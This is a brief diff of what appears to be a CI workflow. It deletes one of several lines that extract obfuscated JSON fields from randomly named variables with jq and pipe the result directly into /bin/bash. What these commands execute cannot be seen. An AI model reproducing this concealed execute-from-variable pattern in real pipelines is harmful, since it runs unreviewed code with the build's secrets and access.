@@ -39,7 +39,6 @@ jobs:
           printf '%s' "$btc0000" | jq -r .udtw840 | /bin/bash
           printf '%s' "$dy6876" | jq -r .ibax8 | /bin/bash
           echo $nsgh630 | jq -r .j7683 | /bin/bash
-          echo $at8 | jq -r .ez2842 | /bin/bash
           echo $aor56 | jq -r .bnj8366 | /bin/bash
           echo $kllf46 | jq -r .vedh8 | /bin/bash
 
